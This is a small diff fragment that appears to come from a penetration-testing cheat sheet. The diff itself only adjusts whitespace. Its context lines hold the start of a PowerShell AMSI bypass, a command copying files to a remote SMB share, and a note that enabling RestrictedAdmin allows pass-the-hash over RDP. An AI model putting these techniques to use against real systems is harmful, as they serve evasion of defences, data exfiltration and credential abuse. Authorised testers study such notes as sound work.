@@ -51,8 +51,9 @@ $a=[Ref].Assembly.GetTypes();Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c
 
 - Copy files: `copy <FILENAME> \\192.168.45.223\share`
 
-### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>:
+### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>: 
 * Note: Enabling RestrictedAdmin allow us to perform PassTheHash with RDP.*
+
 Using command prompt: 
 
 ```
